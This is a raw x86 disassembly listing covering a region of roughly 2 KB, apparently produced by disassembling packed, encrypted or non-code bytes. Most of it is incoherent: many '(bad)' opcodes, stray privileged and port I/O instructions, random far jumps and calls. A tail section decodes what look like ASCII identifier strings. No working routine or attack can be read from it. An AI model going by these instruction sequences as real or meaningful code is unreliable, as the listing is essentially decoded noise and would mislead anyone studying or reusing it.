  426e42:	pop    ds
  426e43:	add    eax,0x77142e9e
  426e48:	data16 jne 0x426e89
  426e4b:	fdiv   QWORD PTR [eax-0x4a331511]
  426e51:	adc    BYTE PTR [eax-0x60],al
  426e54:	xchg   ecx,eax
  426e55:	adc    eax,0xa2c51909
  426e5a:	xor    ebx,DWORD PTR [edi-0x1107118e]
  426e60:	icebp  
  426e61:	and    dl,0x9e
  426e64:	inc    ebx
  426e65:	(bad)  
  426e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e68:	(bad)  
  426e6a:	mov    edi,0x86423c02
  426e6f:	jmp    0x791d:0x1537708d
  426e76:	je     0x426eaa
  426e78:	xor    ecx,DWORD PTR [ebx+0x9]
  426e7b:	jecxz  0x426e87
  426e7d:	enter  0xfe3b,0x41
  426e81:	sbb    DWORD PTR [edi+eax*1-0x7e],edx
  426e85:	jp     0x426eb8
  426e87:	ret    
  426e88:	dec    edx
  426e89:	xor    ah,bl
  426e8b:	dec    esp
  426e8c:	ins    BYTE PTR es:[edi],dx
  426e8d:	popf   
  426e8e:	xchg   edx,eax
  426e8f:	mov    bh,0x63
  426e91:	push   ss
  426e92:	scas   eax,DWORD PTR es:[edi]
  426e93:	mov    edi,0x4699a5f4
  426e98:	xor    eax,0x6eb9e1ab
  426e9d:	loope  0x426ee9
  426e9f:	jae    0x426e65
  426ea1:	(bad)  
  426ea2:	mov    edx,0x4a8cbd1
  426ea7:	and    ecx,ebx
  426ea9:	or     bh,BYTE PTR [ecx+edx*8+0x3]
  426ead:	mov    cl,0x15
  426eaf:	cmc    
  426eb0:	(bad)  
  426eb1:	or     al,0x5b
  426eb3:	push   ecx
  426eb4:	out    dx,al
  426eb5:	int    0x33
  426eb7:	push   eax
  426eb8:	add    al,0x12
  426eba:	rcl    BYTE PTR [esp+edi*1-0x31],cl
  426ebe:	in     al,0x49
  426ec0:	pop    ebp
  426ec1:	daa    
  426ec2:	xor    dh,BYTE PTR [eax-0x7634d675]
  426ec8:	pusha  
  426ec9:	inc    edi
  426eca:	push   edi
  426ecb:	pusha  
  426ecc:	ret    
  426ecd:	mov    cl,0x8e
  426ecf:	fstp   DWORD PTR [ebx+0x3a]
  426ed2:	mov    ecx,0x245ab5c8
  426ed7:	or     BYTE PTR [ebp*2-0x5ad114b],cl
  426ede:	test   ebp,esp
  426ee0:	inc    esi
  426ee1:	(bad)  
  426ee2:	inc    edx
  426ee3:	jo     0x426ea7
  426ee5:	xor    ecx,DWORD PTR [edi]
  426ee7:	and    bh,al
  426ee9:	lea    ebx,[ebx-0x54c1f132]
  426eef:	xchg   ecx,eax
  426ef0:	mov    DWORD PTR [edx+0x46bef02f],esi
  426ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef7:	mov    edx,0xfb517169
  426efc:	call   0x201e:0xa4909be
  426f03:	fcom   st(2)
  426f05:	leave  
  426f06:	sub    esp,DWORD PTR [ebx-0x1958d4b]
  426f0c:	mov    bh,0x6d
  426f0e:	inc    ebx
  426f0f:	test   BYTE PTR [bp+di],dh
  426f12:	dec    DWORD PTR [ebx-0xc]
  426f15:	mov    ch,0xf7
  426f17:	xchg   edx,eax
  426f18:	aas    
  426f19:	add    eax,0x875e6ca6
  426f1e:	pop    es
  426f1f:	xor    DWORD PTR [esi-0x1a7c57db],esp
  426f25:	push   ecx
  426f26:	dec    eax
  426f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f28:	xor    eax,0xbe3df10b
  426f2d:	js     0x426eea
  426f2f:	pop    ss
  426f30:	dec    eax
  426f31:	mov    edx,0xd2e731fe
  426f36:	lds    esi,FWORD PTR [ebp-0x2ad9a48f]
  426f3c:	out    0x92,eax
  426f3e:	and    al,0x38
  426f40:	sbb    ch,cl
  426f42:	shl    BYTE PTR [edx],cl
  426f44:	inc    edx
  426f45:	out    dx,eax
  426f46:	sbb    al,0x10
  426f48:	call   0x6aa7:0x7eb9db55
  426f4f:	inc    eax
  426f50:	push   ebp
  426f51:	aas    
  426f52:	push   esi
  426f53:	sbb    edi,eax
  426f55:	xchg   ecx,eax
  426f56:	retf   
  426f57:	inc    edx
  426f58:	adc    eax,0x2645decb
  426f5d:	ja     0x426fc3
  426f5f:	mov    al,ds:0xbd3cab77
  426f64:	push   esi
  426f65:	add    BYTE PTR [edx-0x5bfb1c5c],al
  426f6b:	sbb    al,0xe
  426f6d:	mov    ecx,0x6e057fce
  426f72:	xor    DWORD PTR [esi-0x5c80ffa9],ebp
  426f78:	push   cs
  426f79:	push   ss
  426f7a:	or     eax,0xbe6e4352
  426f7f:	mov    WORD PTR [ebp-0x22],ss
  426f82:	jp     0x426fcb
  426f84:	xor    eax,0x666ac074
  426f89:	icebp  
  426f8a:	sbb    al,0x25
  426f8c:	jmp    0x3c249a96
  426f91:	gs push ecx
  426f93:	push   ebx
  426f94:	mov    eax,ds:0x5fe6234c
  426f99:	mov    esp,esp
  426f9b:	adc    bh,BYTE PTR [ecx-0x20]
  426f9e:	stos   BYTE PTR es:[edi],al
  426f9f:	div    DWORD PTR [eax-0x7c]
  426fa2:	out    dx,eax
  426fa3:	xchg   esi,eax
  426fa4:	pop    esp
  426fa5:	and    DWORD PTR ds:0x5e3b9b53,edx
  426fab:	cmp    eax,edx
  426fad:	test   BYTE PTR [ebp-0x42bb5af3],bl
  426fb3:	xchg   ebp,eax
  426fb4:	or     eax,DWORD PTR ds:0x94d0796f
  426fba:	adc    eax,0x6df425a2
  426fbf:	and    eax,0xa5c7cb4d
  426fc4:	mov    ecx,0x2d49b145
  426fc9:	dec    ecx
  426fca:	mov    esp,0x59092b06
  426fcf:	xchg   BYTE PTR [esi-0x48],al
  426fd2:	stc    
  426fd3:	mov    dl,0x5a
  426fd5:	cmp    eax,0x19bc0eee
  426fda:	adc    BYTE PTR [esi],dh
  426fdc:	mov    ebp,0x4745ed0d
  426fe1:	jmp    0x172c678
  426fe6:	lock push ebp
  426fe8:	(bad)  
  426fe9:	out    0xf1,al
  426feb:	push   eax
  426fec:	test   DWORD PTR [ecx-0x35],esp
  426fef:	push   ebx
  426ff0:	mov    DWORD PTR [ecx-0x7ce77346],eax
  426ff6:	cli    
  426ff7:	(bad)  
  426ff8:	adc    eax,0x40ac80d0
  426ffd:	xchg   BYTE PTR [ebx+0x1880c50b],dh
  427003:	repnz mov bl,0x92
  427006:	lods   al,BYTE PTR ds:[esi]
  427007:	pop    esp
  427008:	inc    edx
  427009:	lods   eax,DWORD PTR ds:[esi]
  42700a:	sub    al,0x6e
  42700c:	jbe    0x426fe4
  42700e:	inc    ebp
  42700f:	inc    eax
  427010:	imul   edx,DWORD PTR [eax+0x1b],0x28
  427014:	pop    es
  427015:	lea    eax,[ebp+0x61]
  427018:	lahf   
  427019:	mov    ds:0x8fc2f1cf,al
  42701e:	jl     0x42703b
  427020:	xchg   edx,eax
  427021:	cmp    DWORD PTR [eax+0x34],0x9d50e2c4
  427028:	and    cl,BYTE PTR [edi]
  42702a:	retf   0x56cf
  42702d:	mov    edi,0x85938db3
  427032:	pop    ebp
  427033:	stos   DWORD PTR es:[edi],eax
  427034:	arpl   WORD PTR [edi],cx
  427036:	jb     0x427043
  427038:	adc    al,0x38
  42703a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42703b:	dec    ebx
  42703c:	dec    esp
  42703d:	push   edx
  42703e:	loop   0x427031
  427040:	mov    al,BYTE PTR [eax+0x7]
  427043:	test   BYTE PTR [edx-0x1858bf16],0x8a
  42704a:	inc    ecx
  42704b:	test   al,0x69
  42704d:	or     eax,DWORD PTR ds:0xf4d4e20
  427053:	ds or  dh,bh
  427056:	idiv   BYTE PTR [esi]
  427058:	jecxz  0x427017
  42705a:	ss mov al,0x8a
  42705d:	loopne 0x4270dc
  42705f:	loopne 0x427063
  427061:	add    ebx,ecx
  427063:	mov    ch,0xff
  427065:	aas    
  427066:	or     eax,0x1ca55ba1
  42706b:	js     0x4270ae
  42706d:	add    al,0x29
  42706f:	add    BYTE PTR [esi+0x60d9f71d],dh
  427075:	mov    esi,gs
  427077:	jmp    0x40623ee1
  42707c:	aas    
  42707d:	inc    ebp
  42707e:	mov    eax,DWORD PTR [ecx+0x2a109678]
  427084:	(bad)  
  427085:	mov    bh,0x81
  427087:	jmp    0xce30:0x3dce133b
  42708e:	jbe    0x42708e
  427090:	in     eax,dx
  427091:	push   esi
  427092:	xor    ah,al
  427094:	es es enter 0xdb09,0x86
  42709a:	shl    BYTE PTR [edi-0x62],cl
  42709d:	pop    ds
  42709e:	cs scas al,BYTE PTR es:[edi]
  4270a0:	stos   WORD PTR es:[edi],ax
  4270a2:	lods   al,BYTE PTR ds:[esi]
  4270a3:	gs fwait
  4270a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270a6:	pop    ss
  4270a7:	xchg   edi,eax
  4270a8:	adc    bh,ah
  4270aa:	pusha  
  4270ab:	push   ecx
  4270ac:	loop   0x427072
  4270ae:	ret    0xf090
  4270b1:	(bad)
  4270b5:	pop    ebp
  4270b6:	add    BYTE PTR [edx+0x1f],0x62
  4270ba:	popa   
  4270bb:	dec    ecx
  4270bc:	call   0xf3165533
  4270c1:	cld    
  4270c2:	adc    ebx,DWORD PTR [edi+edx*1]
  4270c5:	pop    eax
  4270c6:	inc    ebx
  4270c7:	and    DWORD PTR es:[eax],edi
  4270ca:	imul   ebx,DWORD PTR ss:[eax-0x20],0xfffffff8
  4270cf:	call   0x4d8d96da
  4270d4:	and    dh,BYTE PTR [edi]
  4270d6:	jecxz  0x42712a
  4270d8:	sub    BYTE PTR [ecx-0x3b979422],dh
  4270de:	adc    al,0x89
  4270e0:	jne    0x42712a
  4270e2:	push   edx
  4270e3:	xor    al,al
  4270e5:	mov    ebp,0x6baf43c5
  4270ea:	xor    eax,0xe5c845fa
  4270ef:	pop    edi
  4270f0:	loop   0x42707a
  4270f2:	jp     0x427118
  4270f4:	rcr    DWORD PTR [esi],cl
  4270f6:	jne    0x427115
  4270f8:	add    al,0x7a
  4270fa:	cli    
  4270fb:	pop    esi
  4270fc:	test   al,0xd4
  4270fe:	push   es
  4270ff:	dec    esp
  427100:	and    edi,DWORD PTR [ecx]
  427102:	and    al,0x2e
  427104:	push   eax
  427105:	fmul   st,st(0)
  427107:	icebp  
  427108:	aad    0x67
  42710a:	into   
  42710b:	xor    esp,DWORD PTR [ebx]
  42710d:	out    dx,eax
  42710e:	std    
  42710f:	mov    bh,0x65
  427111:	(bad)  
  427112:	mov    bl,0xe8
  427114:	aam    0x41
  427116:	and    ah,BYTE PTR [esi]
  427118:	lea    edx,[edi+0x12]
  42711b:	xchg   edx,eax
  42711c:	nop
  42711d:	cmc    
  42711e:	push   0x8d7f621c
  427123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427124:	xchg   esi,eax
  427125:	clc    
  427126:	add    eax,0x71e1f87b
  42712b:	pop    ebp
  42712c:	lock adc al,0x3d
  42712f:	and    cl,BYTE PTR [edi]
  427131:	push   ss
  427132:	arpl   bx,sp
  427134:	lds    ebx,FWORD PTR ds:0x649452c5
  42713a:	mov    ebx,0x379fb079
  42713f:	mov    dl,0xcf
  427141:	pop    ebx
  427142:	lock push 0x5d
  427145:	fsubrp st(3),st
  427147:	clc    
  427148:	add    eax,0x43d768e1
  42714d:	push   esp
  42714e:	add    bh,BYTE PTR [ebx-0x17]
  427151:	jns    0x42711f
  427153:	mov    al,cl
  427155:	or     esp,esp
  427157:	push   ss
  427158:	out    0xf2,al
  42715a:	out    0x2,al
  42715c:	push   ebp
  42715d:	xchg   BYTE PTR [esi],al
  42715f:	mov    cs,WORD PTR [ebx+ecx*2]
  427162:	mov    bl,0xf2
  427164:	cmp    DWORD PTR [eax],ebx
  427166:	add    al,0xb7
  427168:	lods   eax,DWORD PTR ds:[esi]
  427169:	pop    eax
  42716a:	pop    ds
  42716b:	mov    bh,0x71
  42716d:	and    eax,DWORD PTR [ecx]
  42716f:	gs mov ecx,0x4db41ced
  427175:	jmp    0x4271eb
  427177:	sub    eax,0x6cebf13a
  42717c:	push   eax
  42717d:	sub    BYTE PTR [edi+0x4],dh
  427180:	call   FWORD PTR [esi]
  427182:	shr    DWORD PTR [eax-0x2a3a23e2],0x2
  427189:	loope  0x42711e
  42718b:	aam    0x90
  42718d:	pop    esi
  42718e:	add    esi,ebp
  427190:	cmp    ebp,eax
  427192:	cmc    
  427193:	int    0x94
  427195:	test   al,0x67
  427197:	popf   
  427198:	pop    es
  427199:	and    esp,DWORD PTR [ebp+edx*8-0x6da475bf]
  4271a0:	push   edx
  4271a1:	adc    DWORD PTR [ecx-0xc],ecx
  4271a4:	sbb    DWORD PTR [edi],ecx
  4271a6:	and    bl,ch
  4271a8:	add    edi,DWORD PTR [eax]
  4271aa:	(bad)
  4271ad:	jmp    0x57d4da19
  4271b2:	icebp  
  4271b3:	xchg   ebx,eax
  4271b4:	mov    ebp,cs
  4271b6:	arpl   WORD PTR [edi+0x11a4c47c],cx
  4271bc:	lahf   
  4271bd:	out    dx,eax
  4271be:	mov    al,ds:0x4862648a
  4271c3:	sbb    BYTE PTR [ebx-0x5bea8df5],bl
  4271c9:	or     al,0xc3
  4271cb:	add    bl,BYTE PTR [eax+edx*1+0x78]
  4271cf:	loopne 0x42724d
  4271d1:	pop    ebx
  4271d2:	cdq    
  4271d3:	xlat   BYTE PTR ds:[ebx]
  4271d4:	hlt    
  4271d5:	ret    
  4271d6:	icebp  
  4271d7:	int    0xc9
  4271d9:	push   esp
  4271da:	jnp    0x4271bf
  4271dc:	bound  esi,QWORD PTR [ebp-0x2f]
  4271df:	aam    0x3
  4271e1:	add    BYTE PTR [eax*4+0x2366a259],bl
  4271e8:	jecxz  0x427239
  4271ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271eb:	sub    BYTE PTR [edi-0x75],bh
  4271ee:	sbb    al,0xde
  4271f0:	jo     0x4271df
  4271f2:	mov    WORD PTR [edi-0x639c4e26],ds
  4271f8:	mov    edi,0x9b5f6d32
  4271fd:	stos   DWORD PTR es:[edi],eax
  4271fe:	add    esp,DWORD PTR [esi-0x2e]
  427201:	or     eax,0x438c88f9
  427206:	ja     0x4271c5
  427208:	xchg   esi,eax
  427209:	or     ch,BYTE PTR [eax+0x16]
  42720c:	hlt    
  42720d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42720e:	pop    edx
  42720f:	xchg   ebx,eax
  427210:	fucomip st,st(5)
  427212:	shr    BYTE PTR [esi],cl
  427214:	stc    
  427215:	dec    esi
  427216:	mov    ebx,0x23949bcc
  42721b:	aam    0xa9
  42721d:	out    dx,al
  42721e:	loop   0x427255
  427220:	xor    dh,BYTE PTR [edi-0x74]
  427223:	jno    0x427267
  427225:	jmp    0x4271cf
  427227:	push   ebx
  427228:	out    0xfd,al
  42722a:	adc    ebx,eax
  42722c:	adc    BYTE PTR [ebp-0x3c],al
  42722f:	mov    edi,0x33c12de7
  427234:	imul   eax,ecx,0x6cb4cc12
  42723a:	jne    0x4271ca
  42723c:	dec    edi
  42723d:	fsub   DWORD PTR [esi+edx*4+0x1f]
  427241:	push   0x77d509d6
  427246:	adc    edi,DWORD PTR [ecx+esi*1-0x5b]
  42724a:	retf   0x210f
  42724d:	and    al,0x84
  42724f:	adc    esi,ebp
  427251:	sbb    bh,BYTE PTR [ecx+0x19ca695]
  427257:	pusha  
  427258:	push   edi
  427259:	inc    edx
  42725a:	ins    DWORD PTR es:[edi],dx
  42725b:	in     eax,dx
  42725c:	xchg   BYTE PTR [edx+0x6c],al
  42725f:	repz scas eax,DWORD PTR es:[edi]
  427261:	pop    ss
  427262:	jl     0x427271
  427264:	cli    
  427265:	dec    edx
  427266:	inc    edx
  427267:	cmp    al,0xc9
  427269:	jecxz  0x4271fc
  42726b:	lods   al,BYTE PTR ds:[esi]
  42726c:	adc    al,0xc2
  42726e:	cwde   
  42726f:	pop    es
  427270:	pop    ecx
  427271:	jge    0x42726a
  427273:	(bad)  
  427274:	jecxz  0x4272ae
  427276:	inc    esp
  427277:	ins    BYTE PTR es:[edi],dx
  427278:	hlt    
  427279:	pop    esp
  42727a:	leave  
  42727b:	fisubr WORD PTR [ecx]
  42727d:	push   ss
  42727e:	add    DWORD PTR [edi-0x36],edi
  427281:	aam    0xa0
  427283:	mov    esi,0xcd436065
  427288:	cwde   
  427289:	sahf   
  42728a:	not    BYTE PTR [ebx]
  42728c:	aad    0xc0
  42728e:	and    al,0xdc
  427290:	out    0x95,al
  427292:	pop    esi
  427293:	stos   DWORD PTR es:[edi],eax
  427294:	fs mov ah,0xf3
  427297:	das    
  427298:	add    al,0x85
  42729a:	mov    ah,dh
  42729c:	loope  0x427249
  42729e:	jbe    0x427260
  4272a0:	mov    edx,0x64688f2a
  4272a5:	lahf   
  4272a6:	clc    
  4272a7:	xor    esp,edi
  4272a9:	mov    esp,edx
  4272ab:	ror    cl,cl
  4272ad:	setbe  bh
  4272b0:	adc    al,0xae
  4272b2:	imul   ebp,ebx,0xabdf5a92
  4272b8:	rdmsr  
  4272ba:	or     eax,DWORD PTR [edx+0x735822ce]
  4272c0:	es pop edi
  4272c2:	addr16 fs jnp 0x427269
  4272c6:	outs   dx,BYTE PTR ds:[esi]
  4272c7:	cmp    cl,BYTE PTR [ebx]
  4272c9:	(bad)  
  4272ca:	mov    ch,0xba
  4272cc:	pop    edi
  4272cd:	pop    ds
  4272ce:	sub    DWORD PTR [eax],esi
  4272d0:	test   edi,eax
  4272d2:	(bad)  
  4272d3:	in     al,dx
  4272d4:	into   
  4272d5:	or     al,al
  4272d7:	retf   
  4272d8:	or     ch,BYTE PTR [ebp+0x78]
  4272db:	mov    ebp,0xe8376550
  4272e1:	loope  0x42733d
  4272e3:	leave  
  4272e4:	sbb    cl,BYTE PTR [eax]
  4272e6:	inc    esp
  4272e7:	pop    edi
  4272e8:	and    BYTE PTR ds:0xc289daa1,dl
  4272ee:	test   cl,0x76
  4272f1:	lods   eax,DWORD PTR ds:[esi]
  4272f2:	sbb    ebp,DWORD PTR [ecx-0x255196b4]
  4272f8:	fcomp  DWORD PTR ds:0x9c6b302c
  4272fe:	cmp    DWORD PTR [edi+eax*8+0x79672b4a],edx
  427305:	(bad)
  427308:	jno    0x427346
  42730a:	fs mov dh,0x4a
  42730d:	inc    edi
  42730e:	jle    0x427315
  427310:	sub    edx,DWORD PTR [ecx-0x732cadb9]
  427316:	cli    
  427317:	jne    0x427350
  427319:	sbb    DWORD PTR [ebp-0x26a1a99f],ebp
  42731f:	fdiv   DWORD PTR [esi]
  427321:	mov    esi,0xb155d8a1
  427326:	mov    al,ds:0x6d1f5f51
  42732b:	call   0x4f846685
  427330:	xchg   ebp,eax
  427331:	xchg   esi,eax
  427332:	inc    ebx
  427333:	xlat   BYTE PTR ds:[ebx]
  427334:	stos   DWORD PTR es:[edi],eax
  427335:	ret    
  427336:	mov    cs,WORD PTR [eax+0x48]
  427339:	icebp  
  42733a:	(bad)  [edi]
  42733c:	or     eax,0xb4239d34
  427341:	jmp    0x3b00:0x41779a91
  427348:	cdq    
  427349:	and    ch,BYTE PTR [eax-0x23]
  42734c:	mov    dl,0x9d
  42734e:	jbe    0x42737f
  427350:	push   0xffffffcb
  427352:	sti    
  427353:	mov    eax,0x3fd4060
  427358:	dec    esi
  427359:	sbb    BYTE PTR [ecx+eax*1+0x19],cl
  42735d:	call   0xb8ce76d7
  427362:	push   0x38
  427364:	sub    BYTE PTR [edx+0x6a],dh
  427367:	das    
  427368:	retf   
  427369:	mov    dl,0xc7
  42736b:	stos   BYTE PTR es:[edi],al
  42736c:	pop    es
  42736d:	fcmovu st,st(4)
  42736f:	loope  0x4273e3
  427371:	xchg   edi,eax
  427372:	jle    0x427385
  427374:	adc    cl,BYTE PTR [edi+0x6f]
  427377:	test   al,0xb9
  427379:	mov    DWORD PTR [esp+edi*2-0x11fa0843],edx
  427380:	and    al,0xb9
  427382:	push   0xbc66ca06
  427387:	sub    al,0x2c
  427389:	(bad)  
  42738a:	xchg   ecx,eax
  42738b:	imul   ebx,DWORD PTR [ebx+0x72783803],0x3a
  427392:	fst    QWORD PTR [esi-0x46]
  427395:	cmp    bh,BYTE PTR [edi]
  427397:	jl     0x427344
  427399:	mov    ecx,ebx
  42739b:	popa   
  42739c:	or     dl,BYTE PTR [edx+esi*4]
  42739f:	pop    ecx
  4273a0:	(bad)  
  4273a1:	sbb    eax,0x9e4471ac
  4273a6:	cdq    
  4273a7:	gs (bad) 
  4273aa:	adc    DWORD PTR [edi+0x21280103],esp
  4273b0:	pop    ecx
  4273b1:	mov    al,0xdc
  4273b3:	sbb    BYTE PTR [ebp-0x39],bh
  4273b6:	push   eax
  4273b7:	pop    ss
  4273b8:	in     al,0xa2
  4273ba:	sub    dh,BYTE PTR ds:0x87258f9e
  4273c0:	xor    ecx,DWORD PTR [ebx+0x25]
  4273c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273c4:	pop    ds
  4273c5:	test   eax,esi
  4273c7:	scas   al,BYTE PTR es:[edi]
  4273c8:	jb     0x42743f
  4273ca:	repz inc edi
  4273cc:	gs pop ecx
  4273ce:	loop   0x4273a5
  4273d0:	lds    esp,FWORD PTR [esi+0x55]
  4273d3:	mov    dh,0xe1
  4273d5:	mov    ebx,0x29022966
  4273da:	lock stos DWORD PTR es:[edi],eax
  4273dc:	retf   0x460e
  4273df:	ins    DWORD PTR es:[edi],dx
  4273e0:	xchg   ecx,eax
  4273e1:	pop    esp
  4273e2:	(bad)  
  4273e3:	cmp    al,0x2a
  4273e5:	dec    esi
  4273e6:	loop   0x4273e0
  4273e8:	or     cl,bl
  4273ea:	in     al,dx
  4273eb:	leave  
  4273ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273ed:	sub    al,0x86
  4273ef:	(bad)  
  4273f0:	xor    DWORD PTR [esp+eax*2+0x1e],edi
  4273f4:	xor    BYTE PTR [esi+eax*1],0x48
  4273f8:	fmulp  st(5),st
  4273fa:	push   ebp
  4273fb:	jl     0x427387
  4273fd:	icebp  
  4273fe:	leave  
  4273ff:	xor    DWORD PTR [esi-0xd00683],esp
  427405:	dec    eax
  427406:	dec    esp
  427407:	add    cl,BYTE PTR [esi]
  427409:	add    al,0x67
  42740b:	xor    ebp,esp
  42740d:	icebp  
  42740e:	add    eax,0x66647d6f
  427413:	xchg   edx,eax
  427414:	jg     0x42740f
  427416:	and    ecx,DWORD PTR [ecx+0x24c47888]
  42741c:	rcl    DWORD PTR [ebx],cl
  42741e:	xor    eax,0x8ab40f35
  427423:	jmp    0x42746d
  427425:	leave  
  427426:	retf   0x35e6
  427429:	jmp    0x42740a
  42742b:	mov    ds:0x53ce5fe3,al
  427430:	repnz shr DWORD PTR fs:[ebp+0x6fc5a65b],0x5f
  427439:	outs   dx,DWORD PTR ds:[esi]
  42743a:	jo     0x4273dc
  42743c:	fst    DWORD PTR [ebx+0x53]
  42743f:	lods   al,BYTE PTR ds:[esi]
  427440:	stc    
  427441:	dec    ecx
  427442:	xor    cl,BYTE PTR [ebx+ecx*4]
  427445:	scas   eax,DWORD PTR es:[edi]
  427446:	(bad)  
  427447:	scas   eax,DWORD PTR es:[edi]
  427448:	mov    ds:0xc582dee5,al
  42744d:	mov    ds:0xe63ae0d6,al
  427452:	scas   eax,DWORD PTR es:[edi]
  427453:	shl    DWORD PTR [ebx],1
  427455:	jmp    0xd06656df
  42745a:	aas    
  42745b:	cs pop ecx
  42745d:	mov    al,0xbb
  42745f:	sti    
  427460:	shl    DWORD PTR [ebx-0x32],cl
  427463:	jge    0x42748b
  427465:	sti    
  427466:	or     al,0x19
  427468:	xor    DWORD PTR ds:0x563e9729,esi
  42746e:	cmp    eax,0x8c636790
  427473:	shl    BYTE PTR [edx],cl
  427475:	and    eax,0x2f9527d8
  42747a:	imul   edx,DWORD PTR [eax+0x29fc9c8d],0x465c86d1
  427484:	jmp    DWORD PTR ds:0x310eff5b
  42748a:	fwait
  42748b:	mov    bh,0xd
  42748d:	and    esi,DWORD PTR [ecx-0x10c1a027]
  427493:	icebp  
  427494:	sti    
  427495:	(bad)  
  427496:	sbb    edi,DWORD PTR [edx-0x21]
  427499:	sbb    DWORD PTR [eax],eax
	...
  427513:	add    BYTE PTR [esi+0x2b],dh
  427516:	dec    eax
  427517:	jbe    0x427576
  427519:	ja     0x427599
  42751b:	sub    esi,DWORD PTR [ebp-0x4b]
  42751e:	(bad)  
  42751f:	retf   0x86bc
  427522:	sbb    ch,BYTE PTR [ebx]
  427524:	inc    ebp
  427525:	push   es
  427526:	add    al,BYTE PTR [eax]
  427528:	add    eax,DWORD PTR [eax]
  42752a:	add    BYTE PTR [eax],al
  42752c:	adc    DWORD PTR [eax-0x4c],ebx
	...
  427593:	add    BYTE PTR [ebx],bh
  427595:	sub    al,0x10
  427597:	add    BYTE PTR [esi+0x5c001070],ch
  42759d:	and    edx,DWORD PTR [eax]
  42759f:	add    BYTE PTR [eax+0x1b],dh
  4275a2:	adc    BYTE PTR [eax],al
  4275a4:	dec    ebp
  4275a5:	adc    dl,BYTE PTR [eax]
  4275a7:	add    BYTE PTR [ebx],bl
  4275a9:	and    dl,BYTE PTR [eax]
  4275ab:	add    BYTE PTR [ecx+0x20],dh
  4275ae:	adc    BYTE PTR [eax],al
  4275b0:	cmp    edx,DWORD PTR gs:[eax]
  4275b3:	add    BYTE PTR [ebx+0x51],dl
  4275b6:	push   esi
  4275b7:	aaa    
  4275b8:	pop    edi
  4275b9:	dec    esp
  4275ba:	push   ebp
  4275bb:	ss push ebp
  4275bd:	pop    edi
  4275be:	xor    al,0x43
  4275c0:	aaa    
  4275c1:	dec    edi
  4275c2:	inc    ecx
  4275c3:	add    BYTE PTR [ebx+0x30],al
  4275c6:	xor    eax,0x47475f30
  4275cb:	push   ecx
  4275cc:	push   ebp
  4275cd:	push   ebx
  4275ce:	pop    edi
  4275cf:	xor    DWORD PTR [edx],esi
  4275d1:	inc    edi
  4275d2:	add    BYTE PTR [edi+0x45],al
  4275d5:	push   ebp
  4275d6:	pop    edi
  4275d7:	push   eax
  4275d8:	push   edx
  4275d9:	inc    ebp
  4275da:	pop    edx
  4275db:	xor    BYTE PTR [edi+0x34],bl
  4275de:	dec    edx
  4275df:	add    BYTE PTR [edx+0x4b],cl
  4275e2:	inc    edi
  4275e3:	ss pop edi
  4275e5:	push   edx
  4275e6:	dec    ecx
  4275e7:	dec    edi
  4275e8:	pop    edi
  4275e9:	push   ebp
  4275ea:	xor    dl,BYTE PTR [edi+0x0]
  4275ed:	push   edi
  4275ee:	cmp    BYTE PTR [ecx],dh
  4275f0:	pop    edi
  4275f1:	xor    eax,0x505357
  4275f6:	dec    ebx
  4275f7:	inc    esp
  4275f8:	aaa    
  4275f9:	pop    edi
  4275fa:	inc    esp
  4275fb:	cmp    BYTE PTR [eax+esi*1+0x34],dl
  4275ff:	pop    edi
  427600:	push   esi
  427601:	add    BYTE PTR [edx+ebx*2+0x42],dl
  427605:	pop    edi
  427606:	push   ebp
  427607:	push   edx
  427608:	inc    esi
  427609:	inc    ebx
  42760a:	dec    esi
  42760b:	xor    eax,DWORD PTR [eax]
  42760d:	inc    ebx
  42760e:	cmp    DWORD PTR [edx+0x5f],eax
  427611:	inc    esi
  427612:	pop    edx
  427613:	push   esi
  427614:	cmp    BYTE PTR [edi+0x4a],bl
  427617:	add    BYTE PTR [ecx+0x38],al
  42761a:	xor    ebx,DWORD PTR [edi+0x52]
  42761d:	push   ebx
  42761e:	pop    ecx
  42761f:	inc    esi
  427620:	xor    al,0x5f
  427622:	xor    eax,0x5a005157
  427627:	push   ebp
  427628:	xor    dh,BYTE PTR [esi]
  42762a:	xor    bl,BYTE PTR [edi+0x33]
  42762d:	inc    esp
  42762e:	push   esi
  42762f:	dec    esp
  427630:	push   ebx
  427631:	pop    edi
  427632:	xor    al,0x0
  427634:	push   ebx
  427635:	cmp    DWORD PTR [ebp+0x33],eax
  427638:	cmp    BYTE PTR [edi+0x59],bl
  42763b:	xor    DWORD PTR [edi+ebx*2+0x46],eax
  42763f:	dec    ebx
  427640:	cmp    DWORD PTR [edx+ebx*2+0x0],ecx
  427644:	inc    esi
  427645:	xor    al,0x48
  427647:	pop    edi
  427648:	xor    ecx,DWORD PTR [eax+0x37]
  42764b:	cmp    DWORD PTR [edi+0x37],ebx
  42764e:	dec    esi
  42764f:	xor    al,0x51
  427651:	add    BYTE PTR [ebx+0x56],dl
  427654:	push   esp
  427655:	pop    edi
  427656:	xor    al,0x37
  427658:	xor    eax,0x325f3353
  42765d:	add    BYTE PTR [eax+0x59],bl
  427660:	inc    esp
  427661:	pop    edi
  427662:	dec    ebx
  427663:	push   esp
  427664:	dec    esp
  427665:	inc    esp
  427666:	pop    edi
  427667:	cmp    DWORD PTR [eax],eax
  427669:	push   edi
  42766a:	dec    eax
  42766b:	push   edi
  42766c:	pop    edi
  42766d:	inc    ebp
  42766e:	dec    esp
  42766f:	inc    ecx
  427670:	xor    DWORD PTR [edi+0x47],ebx
  427673:	add    BYTE PTR [edx+eax*2+0x51],dl
  427677:	pop    edi
  427678:	xor    eax,0x5137385a
  42767d:	xor    eax,0x574d5400
  427682:	pop    edi
  427683:	xor    DWORD PTR [edx+ebx*2+0x53],edx
  427687:	pop    edi
  427688:	pop    eax
  427689:	xor    BYTE PTR [ecx+0x5f],cl
  42768c:	xor    eax,0x33420030
  427691:	xor    al,0x32
  427693:	xor    DWORD PTR [edi+0x58],ebx
  427696:	inc    ecx
  427697:	dec    esi
  427698:	pop    edi
  427699:	inc    edx
  42769a:	push   ebp
  42769b:	push   ecx
  42769c:	add    BYTE PTR [ebp+0x31],al
